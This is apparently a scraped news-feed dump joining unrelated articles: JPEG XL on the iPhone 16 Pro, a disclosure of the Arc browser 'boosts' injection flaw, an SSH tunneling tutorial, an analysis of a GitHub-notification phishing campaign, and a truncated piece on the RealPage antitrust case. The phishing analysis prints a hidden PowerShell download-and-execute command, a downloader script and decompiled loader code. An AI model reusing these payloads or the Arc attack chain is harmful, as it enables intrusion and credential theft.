The RGB color space is familiar to most photographers, but XYB? That’s an odd one. This color space is built on the physiological processes by which people see. </p> <p>“XYB facilitates perceptually uniform quantization,” the JPEG XL community website explains. “JPEG XL uses a color space derived from LMS called XYB. Based on the lower spatial density of S cones, this is interpreted as a hybrid color theory where L and M oppose each other while S is handled trichromatically. As a result, less data is needed for storing blue signals without losing much quality. JPEG XL’s colorspace was derived from Guetzli’s butteraugli metric and is based on Google’s Pik project.” </p> <figure id="attachment_759570" aria-describedby="caption-attachment-759570"><img loading="lazy" decoding="async" src="https://petapixel.com/assets/uploads/2024/09/IMG_0252-800x600.jpg" alt="A serene marina with numerous sailboats and yachts docked neatly in rows.

<p>Overall, JPEG XL addresses many of JPEG’s shortcomings. The 30-year-old format is not very efficient, only offers eight-bit color depth, doesn’t support HDR, doesn’t do alpha transparency, doesn’t support animations, doesn’t support multiple layers, includes compression artifacts, and exhibits banding and visual noise. JPEG XL tackles these issues, and unlike WebP and AVIF formats, which each have some noteworthy benefits too, JPEG XL has been built from the ground up with still images in mind. </p> <h2>Why JPEG XL? Why Now? </h2> <p>As for why it is including JPEG XL in the iPhone 16 Pro, Apple tells <em>PetaPixel</em> that the format promises two primary benefits over standard JPEG format: improved image quality and better compression performance. If there’s a 32MB JPEG image, that same photo will be 24MB in lossless JPEG XL and, even more impressively, about five megabytes in perceptually lossless format. </p> <p>Apple has wrapped JPEG XL photos inside a DNG container, enabling ProRAW files to retain their flexibility while being significantly smaller — up to nearly five times smaller. </p> <p><img loading="lazy" decoding="async" src="https://petapixel.com/assets/uploads/2024/09/iphone-screenshot-jpeg-xl-366x800.jpg" alt="A smartphone screen displays the Pro Default camera formats settings. Options include HEIF Max (up to 48 MP), ProRAW 12 MP, and ProRAW Max (up to 48 MP). It also shows settings for ProRAW format, including JPEG Lossless (Most Compatible), JPEG-XL Lossless, and JPEG-XL Lossy." width="366" height="800" srcset="https://petapixel.com/assets/uploads/2024/09/iphone-screenshot-jpeg-xl-366x800.jpg 366w, https://petapixel.com/assets/uploads/2024/09/iphone-screenshot-jpeg-xl-146x320.jpg 146w, https://petapixel.com/assets/uploads/2024/09/iphone-screenshot-jpeg-xl-702x1536.jpg 702w, https://petapixel.com/assets/uploads/2024/09/iphone-screenshot-jpeg-xl.jpg 731w" sizes="(max-width: 366px) 100vw, 366px"></p> <p>So, what’s the catch? Apple admits that JPEG XL is not universally adopted or supported, at least not yet, so it is not the ideal choice for every person. Each user will need to evaluate their workflow and needs and determine if JPEG XL fits. JPEG XL’s benefits won’t mean much to someone who works with software or platforms that don’t support the file. </p> <p>As Apple explains on the new iPhone models, JPEG XL files are supported on iOS 17 and later and macOS 14 and later. However, as mentioned, these .jxl files are wrapped in a DNG container, so you can’t just fire off .jxl files from the iPhone 16 Pro. </p> <figure id="attachment_759564" aria-describedby="caption-attachment-759564"><img loading="lazy" decoding="async" src="https://petapixel.com/assets/uploads/2024/09/jpeg-xl-story-apple-pr-3-800x558.jpg" alt="A collage of six vibrant photos: A striking profile of a woman with colorful makeup, two people lying on a blanket outdoors wearing sunglasses, a woman in a white dress standing in a field, a person on a sunny rooftop, a close-up of a praying mantis, a person in a bright green sweater taking a selfie on a cobblestone street." width="800" height="558" srcset="https://petapixel.com/assets/uploads/2024/09/jpeg-xl-story-apple-pr-3-800x558.jpg 800w, https://petapixel.com/assets/uploads/2024/09/jpeg-xl-story-apple-pr-3-320x223.jpg 320w, https://petapixel.com/assets/uploads/2024/09/jpeg-xl-story-apple-pr-3-1536x1071.jpg 1536w, https://petapixel.com/assets/uploads/2024/09/jpeg-xl-story-apple-pr-3.jpg 1600w" sizes="(max-width: 800px) 100vw, 800px"><figcaption id="caption-attachment-759564">Credit: Apple</figcaption></figure>
<p>As has been the case with some of Apple’s other early adoptions, like Thunderbolt, not everything always works in every case. One can just look at the rollout of the HEIC format in the photo space for evidence of how new formats don’t always take hold and receive fast, widespread support. Compared to JPEG XL, HEIC — an implementation of HEIF — is just not good. </p> <p>With JPEG XL, while the benefits of the format are obvious and numerous, there are apt to be growing pains. Apple has done its part to limit these issues by offering JPEG XL support across its platforms and utilizing DNG containers.</p> <p>The other side of the coin is that because Apple is adopting and supporting JPEG XL, other companies may follow suit. While Samsung added JPEG XL to its latest Galaxy smartphones earlier this year, that doesn’t carry the same weight as Apple bringing JPEG XL to its latest smartphones and supporting it across its entire ecosystem. </p> <p>That’s not to say that JPEG XL is a few short months away from being as ubiquitous as the standard JPEG image format. It will take time, and there’s no guarantee the format will ever be universally supported. </p> <p>JPEG XL addresses many of the problems of JPEG images, so hopefully, JPEG XL will receive widespread support. As Apple fully understands, JPEG XL is clearly the superior format for photographers. </p> <figure id="attachment_759528" aria-describedby="caption-attachment-759528"><img loading="lazy" decoding="async" src="https://petapixel.com/assets/uploads/2024/09/IMG_0287-600x800.jpg" alt="A wooden wall decorated with an eclectic mix of items including a guitar, paddle, windows, signs, a framed picture, and various knick-knacks.

Even when wandering outside the Mac/iPhone/iPad ecosystem, using JPEG XL can be a painless experience. It’s easy enough to open and edit JPEG XL files in Adobe software, for example. </p>
<figure id="attachment_759563" aria-describedby="caption-attachment-759563"><img loading="lazy" decoding="async" src="https://petapixel.com/assets/uploads/2024/09/jpeg-xl-story-apple-pr-4-800x718.jpg" alt="A hand is holding a smartphone, displaying a camera viewfinder.

JPEG is old and outdated, but its age has come myriad support and compatibility. Fortunately, reverse transcoding between JPEG and JPEG XL is possible, but even that still requires development efforts. The point is that just because JPEG XL is obviously better than many competing formats, it doesn’t mean everyone will adopt it. </p> <figure id="attachment_759569" aria-describedby="caption-attachment-759569"><img loading="lazy" decoding="async" src="https://petapixel.com/assets/uploads/2024/09/jpeg-xl-environmental-impact-800x487.jpg" alt="An infographic titled &quot;Environmental Impact&quot; explains that delivering JPEG XLs instead of JPEGs could save 4.87 gigawatt-hours per day.

There’s little doubt that JPEG XL is an excellent image format that offers the quality of heavyweight formats with a file size even smaller than that of JPEGs. What would typically be a 75-ish megabyte ProRAW Max file will be about 20MB in a lossy ProRAW format using JPEG XL compression. A lossless file is still under 50MB. Without compromising quality, those are significant storage savings.</p>  </div></div>]]></description>

<div id="readability-page-1" class="page"><article><div><p>we start at the homepage of arc. where i first landed when i first heard of it. i snatched a download and started analysing, the first thing i realised was that arc requires an account to use, why do they require an account?</p>
<h2>introducing arcs cloud features</h2>
<p>so i boot up my mitmproxy instance and i sign up, and i see that they are using firebase for authentication, but no other requests, are they really just using firebase only for authentication?</p>
<p>after poking around for a bit, i discovered that there was a arc featured called easels, easels are a whiteboard like interface, and you can share them with people, and they can view them on the web. when i clicked the share button however, there was no requests in my mitmproxy instance, so whats happening here?</p>
<h2>hacking objective-c based firebase apps</h2>
<p>from previous experience hacking an IOS based app, i immediately had a hunch on what this was, firestore.</p>
<p>firestore is a database-as-a-backend service that allows for developers to not care about writing a backend, and instead write database security rules and make users directly access the database.</p>
<p>this has <a href="https://env.fail/posts/firewreck-1">of course sparked a lot of services having insecure or insufficient security rules</a> and since researching that, i would like to call myself a firestore expert.</p>
<p>firestore has a tendency to not abide by the system proxy settings in the Swift SDK for firebase, so going off my hunch, i wrote a frida script to dump the relevant calls.</p>

<p>sick. so it looks like arc stores some preferences in firestore, along with a basic user object, referrals and boosts</p>
<h2>what the hell are arc boosts</h2>
<p>arc boosts are a way for users to customize websites, by blocking elements, changing fonts, colors, and even using their own custom css and js.</p>
<p><strong>do you see where this is going?</strong>, so, i manually logged into my account using my dummy page to test firebase accounts, and executed the exact same query to get my boosts:</p>
<p><img src="https://kibty.town/files/img/posts/arc/firebase-query-1.png" alt=""></p>
<p>cool, let me create a simple boost on google.com</p>

<p>hey! theres our boost, lets try changing some parameters around.</p>
<p>i see that it queries by <code>creatorID</code>, and we cant <em>query</em> a different creator ID than the original, but what if we update our own boost to have another users id?</p>
<p>well, i tried it with another account of mine, and this way the result when i went to google.com on the other computer (the victim one)</p>
<p><img src="https://kibty.town/files/img/posts/arc/alert-popup.png" alt=""></p>
<p><strong>what the fuck? it works?</strong></p>
<h3>quick recap</h3>
<ul>
<li>arc boosts can contain arbitrary javascript</li>
<li>arc boosts are stored in firestore</li>
<li>the arc browser gets which boosts to use via the <code>creatorID</code> field</li>
<li><strong>we can arbitrarily chage the <code>creatorID</code>&nbsp;field to any user id</strong></li>
</ul>
<p>thus, if we were to find a way to easily get someone elses user id, we would have a full attack chain</p>
<h2>getting another users id</h2>
<h3>user referrals</h3>
<p>when someone referrs you to arc, or you referr someone to arc, you automatically get their user id in the <code>user_referrals</code> table, which means you could just ask someone for their arc invite code and they'd likely give it</p>
<h3>published boosts</h3>
<p>you can share arc boosts (only if they don't have js in them) with other people, and arc has a <a href="https://arc.net/boosts">public site</a> with boosts, and boostSnapshots (published boosts) contain the user id of the creator.</p>
<h3>user easels</h3>
<p>arc has a feature called easels, which are basically whiteboards, you can share easels, and this also allows you to get someones user id.</p>
<h2>putting it together</h2>
<p>this would be the final attack chain:</p>
<ul>
<li>obtain the user id of the victim via one of the mentioned methods</li>
<li>create a malicious boost with whatever payload you want on your own account</li>
<li>update the boost <code>creatorID</code> field to the targets</li>
<li>whenever the victim visits the targeted website, they will get compromised</li>
</ul>
<p>the browser company normally does not do bug bounties, but for this catastrophic of a vuln, they decided to award me with <strong>$2,000</strong> USD</p>
<p>the timeline for the vulnerability:</p>
<ul>
<li><strong>aug 25 5:48pm</strong>: got initial contact over signal (encrypted) with arc co-founder hursh</li>
<li><strong>aug 25 6:02pm</strong>: vulnerability poc executed on hursh's arc account</li>
<li><strong>aug 25 6:13pm</strong>: added to slack channel after details disclosed over encrypted format</li>
<li><strong>aug 26 9:41pm</strong>: vulnerability patched, bounty awarded</li>
<li><strong>sep 6 7:49pm</strong>: cve assigned (CVE-2024-45489)</li>
</ul>
<h2>rce on priviliged pages</h2>
<p>while poking around, i saw that boosts actually execute for other protocols aswell (even though you cant create them in the client), so someone could create a boost targeting the page <code>settings</code>, and it would execute on <code>chrome://settings</code>, which allows further escalation of priviliges.</p>
<h2>privacy concerns</h2>
<p>while researching, i saw some data being sent over to the server, like this query everytime you visit a site:</p>
<pre><code>firebase
  .<span>collection</span>(<span>"boosts"</span>)
  .<span>where</span>(<span>"creatorID"</span>, <span>"=="</span>, <span>"UvMIUnuxJ2h0E47fmZPpHLisHn12"</span>)
  .<span>where</span>(<span>"hostPattern"</span>, <span>"=="</span>, <span>"www.google.com"</span>);
</code></pre>
<p>the <code>hostPattern</code> being the site you visit, this is against <a href="https://arc.net/privacy">arc's privacy policy</a> which clearly states arc does not know which sites you visit.</p>

<div id="readability-page-1" class="page"><div>
<p>To make it quick, I wish I had known about port forwarding and tunneling earlier. With this blog post, I try to understand it better myself and share some experiences and tips with you.</p>
<p><strong>Topics</strong>: use cases, configuration, SSH jumphosts, local/remote/dynamic port forwarding, and limitations</p>
<h2 id="use-cases-a-hrefuse-cases-iduse-casesa">Use cases <a href="#use-cases" id="use-cases">#</a></h2>
<p>SSH tunneling and port forwarding can be used to forward TCP traffic over a secure SSH connection from the SSH client to the SSH server, or vice versa. TCP ports or UNIX sockets can be used, but in this post I’ll focus on TCP ports only.</p>
<p>I won’t go into details, but the following post should show enough examples and options to find use in your day-to-day work.</p>
<dl>
<dt>Security:</dt>
<dd>encrypt insecure connections (FTP, other legacy protocols)</dd>
<dd>access web admin panels via secure SSH tunnel (Pub Key Authentication)</dd>
<dd>having potentially less ports exposed (only 22, instead of additional 80/443)</dd>
<dt>Troubleshooting:</dt>
<dd>bypassing firewalls/content filters</dd>
<dd>choosing different routes</dd>
<dt>Connection:</dt>
<dd>reach server behind NAT</dd>
<dd>use jumphost to reach internal servers over the internet</dd>
<dd>exposing local ports to the internet</dd>
</dl>
<p>There are many more use cases, but this overview should give you a sense of possibilities.</p>
<h2 id="port-forwarding">Port forwarding</h2>
<p>Before we start: the options of the following examples and be combined and configured to suit your setup. As a side note: if the <code>bind_address</code> isn’t set, localhost will be the default</p>
<h2 id="configuration--preparation-a-hrefconfiguration-idconfigurationa">Configuration / Preparation <a href="#configuration" id="configuration">#</a></h2>
<ul>
<li>The <strong>local and remote users must have the necessary permissions</strong> on the local and remote machines respectivly to open ports. <strong>Ports between 0-1024 require root privileges</strong> - if not configured differently - and the rest of the ports can be configured by standard users.</li>
<li><strong>configure clients and network firewalls accordingly</strong></li>
</ul>
<dl>
<dt>SSH port forwarding must be enabled on the server:</dt>
<dd><code>AllowTcpForwarding yes</code></dd>
<dd><em>It is enabled by default, if I recall it correctly</em></dd>
<dt>If you forward ports on interfaces other than 127.0.01, then you’ll need to enable <code>GatewayPorts</code> on the SSH server:</dt>
<dd><code>GatewayPorts yes</code></dd>
</dl>
<p>Remember to <strong>restart the ssh server service</strong>.</p>
<h2 id="ssh-jumphost--ssh-tunnel-a-hrefjumphost-idjumphosta">SSH jumphost / SSH tunnel <a href="#jumphost" id="jumphost">#</a></h2>
<p>Transparently connecting to a remote host through one or more hosts.</p>
<p><code>ssh -J user@REMOTE-MACHINE:22 -p 22 user@10.99.99.1</code></p>
<p><img src="https://ittavern.com/images/blog/ssh-jh-1.png" alt="ssh-port-forwarding-info"></p>
<p><strong>Side note</strong>: The port addressing can be removed, if the default port 22 is used!</p>
<p>On REMOTE-MACHINE as jumphost:</p>
<pre><code>[user@REMOTE-MACHINE]$ ss | grep -i ssh
tcp   ESTAB 0      0                                             167.135.173.108:ssh    192.160.140.207:45960
tcp   ESTAB 0      0                                             10.99.99.2:49770      10.99.99.1:ssh
</code></pre>
<dl>
<dt>Explanation:</dt>
<dd><code>167.135.173.108</code> - public IP of REMOTE-MACHINE</dd>
<dd><code>92.160.120.207</code> - public IP of LOCAL-MACHINE</dd>
<dd><code>10.99.99.2</code> - internal IP of REMOTE-MACHINE</dd>
<dd><code>10.99.99.1</code> - internal IP of REMOTE-WEBAPP</dd>
</dl>
<h4 id="using-multiple-jumphosts">Using multiple jumphosts</h4>

<p><strong>Important</strong>: <code>GatewayPorts yes</code> must be enabled on the SSH server to listen on another interface than the loopback interface.</p>
<h2 id="dynamic-port-forwarding-a-hrefdynamic-port-forwarding-iddynamic-port-forwardinga">Dynamic port forwarding <a href="#dynamic-port-forwarding" id="dynamic-port-forwarding">#</a></h2>
<p>To forward more than one port, SSH uses the <a href="https://en.wikipedia.org/wiki/SOCKS">SOCKS</a> protocol. This is a transparent proxy protocol and SSH makes us of the most recent version SOCKS5.</p>
<p>Default port for SOCKS5 server is 1080 as defined in <a href="https://datatracker.ietf.org/doc/html/rfc1928">RFC 1928</a>.</p>
<p>The client must be configured correctly to use a SOCKS proxy. Either on the application or OS layer.</p>
<h4 id="example">Example</h4>
<p><code>ssh -D 10.10.10.1:5555 user@REMOTE-MACHINE</code></p>
<p><img src="https://ittavern.com/images/blog/ssh-dpf-1.png" alt="ssh-port-forwarding-info"></p>
<dl>
<dt>Use <code>curl</code> on a ‘LOCAL’ client to test the correct connection/path:</dt>
<dd><code>curl -L -x socks5://10.10.10.1:5555 brrl.net/ip</code></dd>
<dd><em>If everything works out, you should get the public IP of the REMOTE-MACHINE back</em></dd>
</dl>
<h2 id="ssh-tuntap-tunneling">SSH TUN/TAP tunneling</h2>
<p>I won’t go into detail, but you can create a bi-directional TCP tunnel with the <code>-w</code> flag. The interfaces must be created beforehand, and I haven’t tested it yet.</p>
<p><code>-w local_tun[:remote_tun]</code></p>
<h2 id="how-to-run-ssh-in-the-background-a-hrefbackground-idbackgrounda">How to run SSH in the background <a href="#background" id="background">#</a></h2>
<dl>
<dt>The native way to run the tunnel in the background would be <code>-fN</code>:</dt>
<dd><code>-f</code> - run in the background</dd>
<dd><code>-N</code> - no shell</dd>
</dl>
<p><code>ssh -fN -L 8001:127.0.0.1:8000 user@REMOTE-MACHINE</code></p>
<p>Others than that: use screen or some other tools.</p>
<h4 id="stop-the-ssh-running-in-the-background">Stop the SSH running in the background</h4>
<pre><code>user@pleasejustwork:~$ ps -ef | grep ssh
[...]
user      19255       1  0 11:40 ?        00:00:00 ssh -fN -L 8001:127.0.0.1:8000 user@REMOTE-MACHINE

</code></pre>
<dl>
<dt>Kill the process with the PID:</dt>
<dd><code>kill 19255</code></dd>
</dl>
<h2 id="keep-ssh-connection-alive">Keep SSH connection alive</h2>
<p>I won’t go into detail, but there are different ways to keep the SSH connection alive.</p>
<h4 id="handle-timeouts-with-heartbeats">Handle timeouts with heartbeats</h4>
<p>Both options can be set on the client or server, or both.</p>
<dl>
<dt><code>ClientAliveInterval</code> will send a request every <code>n</code> seconds to keep the connection alive:</dt>
<dd><code>ClientAliveInterval 15</code></dd>
<dt><code>ClientAliveCountMax</code> is the number of heartbeat requests sent after not receiving an respond from the other side of the connection before terminating the connection:</dt>
<dd><code>ClientAliveCountMax 3</code></dd>
<dd><code>3</code> is the default, and setting it to <code>0</code> will disable connection termination. In this example, the connection would drop after around 45 seconds without any responds.</dd>
</dl>
<h4 id="reconnecting-after-termination">Reconnecting after termination</h4>
<p>There are mutliple ways to do it; autossh, scripts, cronjobs, and so on.</p>
<p>This is beyond this post and I might write about in the future.</p>
<h2 id="limitations-a-hreflimitations-idlimitationsa">Limitations <a href="#limitations" id="limitations">#</a></h2>
<h4 id="udp">UDP</h4>
<p>SSH depends on a reliable delivery to be able to decrypt everything correctly. UDP does not offer any reliability and is therefore not supported and recommended to use over the SSH tunnel.</p>
<p>That said, there are ways to do it as described in <a href="http://zarb.org/~gc/html/udp-in-ssh-tunneling.html">this post</a>. I still need to test it.</p>
<h4 id="tcp-over-tcp">TCP-over-TCP</h4>
<p>It lowers the throughput due to more overhead and increases the latency. On connections with packet loss or high latencies (e.x. satellite) it can cause a <a href="https://openvpn.net/faq/what-is-tcp-meltdown/">TCP meltdown</a>.</p>
<p><a href="http://sites.inka.de/sites/bigred/devel/tcp-tcp.html">This post</a> is a great write-up.</p>
<p>Nevertheless, I’d been using OpenVPN-over-TCP for a while, and it worked flawlessly. Less throughput than UDP, but reliable. So, it highly depends on your setup.</p>
<h4 id="not-a-vpn-replacement">Not a VPN replacement</h4>
<p>Overall, it is not a VPN replacement. SSH tunneling can be used as such, but a VPN is better suited for better performance.</p>
<h4 id="potential-security-risk">Potential security risk</h4>
<p>If you do not need those features, it is recommended to turn them of. Threat actors could use said features to avoid firewalls and other security measures.</p>

            <pubDate>Thu, 19 Sep 2024 21:16:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ianspence.com/blog/2024-09/github-email-hijack/">https://ianspence.com/blog/2024-09/github-email-hijack/</a>, See on <a href="https://news.ycombinator.com/item?id=41596466">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                <p>As an open source developer I frequently get emails from GitHub, most of these emails are notifications sent on behalf of GitHub users to let me know that somebody has interacted with something and requires my attention. Perhaps somebody has created a new issue on one of my repos, or replied to a comment I left, or opened a pull request, or perhaps the user is trying to impersonate GitHub security and trick me into downloading malware.</p>
<p>If that last one sounds out of place, well, I have bad news for you - it's happened to me. Twice. In one day. Let me break down how this attack works:</p>
<ol>
<li>The attacker, using a throw-away GitHub account, creates an issue on any one of your public repos</li>
<li>The attacker quickly deletes the issue</li>
<li>You receive a notification email as the owner of the repo</li>
<li>You click the link in the email, thinking it's legitimate</li>
<li>You follow the instructions and infect your system with malware</li>
</ol>
<p>Now, as a savvy computer-haver you might think that you'd never fall for such an attack, but let me show you all the clever tricks employed here, and how attackers have found a way to hijack GitHub email system to send malicious emails directly to project maintainers.</p>
<p>To start, let's look at the email message I got:</p>
<p><img src="https://ianspence.com/blog/2024-09/github-email-hijack/issue_email.png" alt="An email supposedly from the Github Security Team"></p>
<p>In text form (link altered for your safety):</p>
<blockquote>
<p>Hey there!</p>
<p>We have detected a security vulnerability in your repository. Please contact us at [https://]github-scanner[.]com to get more information on how to fix this issue.</p>
<p>Best regards,<br>
Github Security Team</p>
</blockquote>
<p>Without me having already told you that this email is a notification about a new GitHub issue being created on my repo, there's virtually nothing to go on that would tell you that, because the majority of this email is controlled by the attacker.</p>
<p>Everything highlighted in red is, in one way or another, something the attacker can control - meaning the text or content is what they want it to say:</p>
<p><img src="https://ianspence.com/blog/2024-09/github-email-hijack/email_attacker_parts.png" alt="An annotated copy of the email. Most of the subject as well as the body are highlighted in red."></p>
<p>Unfortunately the remaining parts of the email that aren't controlled by the attacker don't provide us with any sufficient amount of context to know what's <em>actually</em> going on here. Nowhere in the email does it say that this is a new issue that has been created, which gives the attacker all the power to establish whatever context they want for this message.</p>
<p>The attacker impersonates the "Github Security Team", and because this email is a legitimate email sent from Github, it passes most of the common phishing checks. The email <em>is</em> from Github, and the link in the email <em>goes</em> to where it says it does.</p>
<p>GitHub can improve on these notification emails to reduce the effectiveness of this type of attack by providing more context about what action is the email for, reducing the amount of attacker-controlled content, and improving clarity about the sender of the email. I have contacted Github security (the real one, not the fake imposter one) and shared these emails with them along with my concerns.</p>
<h2 id="the-website">The Website</h2>
<p>If you were to follow through with the link on that email, you'd find yourself on a page that appears to have a captcha on it. Captcha-gated sites are annoyingly common, thanks in part to services like Cloudflare which offers automated challenges based on heuristics. All this to say that users might not find a page immediately demanding they prove that they are human not that out of the ordinary.</p>
<p><img src="https://ianspence.com/blog/2024-09/github-email-hijack/website_captcha.png" alt="A screenshot of a website asking you to verify that you're a human"></p>
<p>What is out of the ordinary is how the captcha works. Normally you'd be clicking on a never-ending slideshow of sidewalks or motorcycles as you <em>definitely don't help train AI</em>, but instead this site is asking you to take the very specific step of opening the Windows Run box and pasting in a command.</p>
<p><img src="https://ianspence.com/blog/2024-09/github-email-hijack/website_clipboard.png" alt="A screenshot of a website on asking you to run some code"></p>
<p>Honestly, if solving captchas were actually this easy, I'd be down for it. Sadly, it's not real - so now let's take a look at the malware.</p>
<h2 id="the-malware">The Malware</h2>
<p>The site put the following text in my clipboard (link modified for your safety):</p>
<pre><code>powershell.exe -w hidden -Command "iex (iwr '[https://]2x[.]si/DR1.txt').Content" # "✅ ''I am not a robot - reCAPTCHA Verification ID: 93752"

<p>We'll consider this stage 1 of 4 of the attack. What this does is start a new Windows PowerShell process with the window hidden and run a command to download a script file and execute it. <code>iex</code> is a built-in alias for <code>Invoke-Expression</code>, and <code>iwr</code> is <code>Invoke-WebRequest</code>. For Linux users out there, this is equal to calling <code>curl | bash</code>. A comment is at the end of the file that, due to the Windows run box being limited in window size, effectively hides the first part of the script, so the user only sees this:</p>
<p><img src="https://ianspence.com/blog/2024-09/github-email-hijack/windows_run.png" alt="A screenshot of the Windows run box"></p>
<p>Between the first email I got and the time of writing, the URL in the script have changed, but the contents remain the same.</p>
<p>Moving onto the second stage, the contents of the evaluated script file are (link modified for your safety):</p>
<pre data-language="powershell"><span>$webClient</span> = <span>New-Object</span> System.Net.WebClient
<span>$url1</span> = <span>"[https://]github-scanner[.]com/l6E.exe"</span>
<span>$filePath1</span> = <span>"<span>$env:TEMP</span>\SysSetup.exe"</span>
<span>$webClient</span>.DownloadFile(<span>$url1</span>, <span>$filePath1</span>)
<span>Start-Process</span> <span>-FilePath</span>  <span>$env:TEMP</span>\SysSetup.exe

</pre>
<p>This script is refreshingly straightforward, with virtually no obfuscation. It downloads a file <code>l6E.exe</code>, saves it as <code>&lt;User Home&gt;\AppData\Local\Temp\SysSetup.exe</code>, and then runs that file.</p>
<p>I first took a look at the exe itself in Windows Explorer and noticed that it had a digital signature to it.</p>
<p><img src="https://ianspence.com/blog/2024-09/github-email-hijack/codesigning.png" alt="Screenshot of the codesignature for the malicious exe"></p>
<p>The certificate used appears to have come from Spotify, but importantly the signature of the malicious binary is not valid - meaning it's likely this is just a spoofed signature that was copied from a legitimately-signed Spotify binary.</p>
<p>I opened the exe in Ghidra and then realized that I know <em>nothing</em> about assembly or reverse engineering, but I did see mentions of .NET in the output, so I moved to dotPeek to see what I could find.</p>
<p>There's two parts of the code that matter, the entrypoint and the <code>PersonalActivation</code> method.</p>
<p>The entrypoint hides the console window, calls <code>PersonalActivation</code> twice in a background thread, then marks a region of memory as executable with <code>VirtualProtect</code> and then executes it with <code>CallWindowProcW</code>.</p>
<pre data-language="csharp"><span><span>private</span> <span>static</span> <span>void</span> <span>Main</span>(<span><span>string</span>[] args</span>)</span>
{
  Resolver resolver = <span>new</span> Resolver(<span>"Consulter"</span>, <span>100</span>);
  Program.FreeConsole();
  <span>double</span> num = (<span>double</span>) Program.UAdhuyichgAUIshuiAuis();
  Task.Run((Action) (() =&gt;
  {
    Program.PersonalActivation(<span>new</span> List&lt;<span>int</span>&gt;(), Program.AIOsncoiuuA, Program.Alco);
    Program.PersonalActivation(<span>new</span> List&lt;<span>int</span>&gt;(), MoveAngles.userBuffer, MoveAngles.key);
  }));
  Thread.Sleep(<span>1000</span>);
  <span>uint</span> ASxcgtjy = <span>0</span>;
  Program.VirtualProtect(<span>ref</span> Program.AIOsncoiuuA[<span>0</span>], Program.AIOsncoiuuA.Length, <span>64U</span>, <span>ref</span> ASxcgtjy);
  <span>int</span> index = <span>392</span>;
  Program.CallWindowProcW(<span>ref</span> Program.AIOsncoiuuA[index], MoveAngles.userBuffer, <span>0</span>, <span>0</span>, <span>0</span>);
}

</pre>
<p>The <code>PersonalActivation</code> function takes in a list and two byte arrays. The list parameter is not used, and the first byte array is a data buffer and the second is labeled as <code>key</code> - this, plus the amount of <em>math</em> they're doing, gives it away that is is some form of decryptor, though I'm not good enough at math to figure out what algorithm it is.</p>
<p>I commented out the two calls to <code>VirtualProtect</code> and <code>CallWindowProcW</code> and compiled the rest of the code and ran it in a debugger, so that I could examine the contents of the two decrypted buffers. The first buffer contains a call to <code>CreateProcess</code></p>

<p>So now we know that the large byte arrays at the top of the code are an <em>"encrypted"</em> exe that this loader puts into memory, marks it as executable, and then executes it. Marvelous.</p>
<p>Sadly, this is where I hit a wall as my skills at reverse engineering applications are very limited. The final stage of the attack is a Windows exe, but not one made with .NET, and I don't really know what I'm looking at in the output from Ghidra.</p>
<p>Thankfully, however, <em>actual professionals</em> have already done the work for me! Naturally, I put <em>both</em> the <a href="https://www.virustotal.com/gui/file/d737637ee5f121d11a6f3295bf0d51b06218812b5ec04fe9ea484921e905a207">first</a> and <a href="https://www.virustotal.com/gui/file/5aead2773474aa64c7e5300d49eca7ee01174fe806fd73f4a878ae4b2a4aaca1">second</a> binaries into VirusTotal and found that they were already flagged by a number of AVs. A common pattern in the naming was "LUMMASTEALER", which gives us our hint as to what this malware is.</p>
<p>Lumma is one of many malware operations (read: gangs) that offer a "malware as a service" product. Their so-called "stealer" code searches through your system for cryptocurrency wallets, stored credentials, and other sensitive data. This data is then sent to their command-and-control (C2) servers where the gang can then move on to either stealing money from you, or profit from selling your data online.</p>
<p>Lumma's malware tends to not encrypt victims devices such as traditional ransomware operations do.</p>
<p>For more information I recommend this <a href="https://medium.com/@Cyfirma_/lumma-stealer-tactics-impact-and-defense-strategies-6f44a682742f">excellent write-up</a> from Cyfirma.</p>
<hr>
<p>If you made it this far, thanks for reading! I had a lot of fun looking into the details of this attack, ranging from the weakness in Github's notification emails to the multiple layers of the attack.</p>
<p>Some of the tools I used to help me do this analysis were:</p>
<ul>
<li>Windows Sandbox</li>
<li>Ghidra</li>
<li>dotPeek</li>
<li>HxD</li>
<li>Visual Studio</li>
</ul>
<hr>
<p>Updates:</p>
<ul>
<li>Previously I said that the codesigning certificate was stolen from Spotify, however after discussing my findings with DigiCert we agreed that this is not the case and rather that the signature is being spoofed.</li>

<div id="readability-page-1" class="page"><div dir="auto"><p><span>Late last month, the Department of Justice </span><a href="https://www.thebignewsletter.com/p/antitrust-enforcers-the-rent-is-too" rel="">filed a complaint</a><span> against a software and consulting firm called RealPage, alleging a broad conspiracy among corporate landlords to increase rents to millions nationwide. RealPage sold software and services to large real estate management firms, which in aggregate control rents for 16 million units nationwide, which is a not small fraction (36%) of the 44 million renting households in America.</span></p><p><span>This alleged conspiracy matters for a lot of reasons, but the most important one being that housing costs are a crisis in America. Last week, the government </span><a href="https://www.bls.gov/news.release/cpi.nr0.htm" rel="">released statistics</a><span> showing that rent went up by 5% over the past twelve months, and that the cost of shelter accounts for 70% of </span><em>all inflation for the last twelve months.</em><span> The CPI matters, because the key price control agency in the economy, the Federal Reserve, sets prices for credit and loans based on this data, rationing credit to, say, small businesses based on what its economists think about how that will affect demand. Higher rent prices, in other words, are not just a problem for families trying to get shelter, but are actually impacting macro-economic policies for the entire economy, shifting  the cost of financing every city, factory, airplane, credit card, et al. </span></p><p>And that brings me back to the Antitrust Division’s lawsuit against RealPage. Is this case more than an (alleged) price-fixing conspiracy? Could it point to a broader problem in the economy?</p><p><span>Let’s start with what this firm actually did. RealPage allegedly encouraged excess rental prices in a </span><a href="https://www.thebignewsletter.com/p/antitrust-enforcers-the-rent-is-too" rel="">number of ways</a><span>. First, it collected sensitive information about the market and let its clients know what everyone else was charging. Second, it explicitly encouraged rent hikes through default settings in its software, and by having its RealPage “pricing advisors” harass employees of clients until they raised rents. As one unnamed landlord put it, “I always liked this product because your algorithm uses proprietary data from other subscribers to suggest rents and term. That’s classic price fixing." And finally, it hosted in-person meetings where its clients would talk with one another about raising prices. </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2313d950-9fb3-4998-aa81-1c9349ca62f4_680x608.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2313d950-9fb3-4998-aa81-1c9349ca62f4_680x608.jpeg 424w, 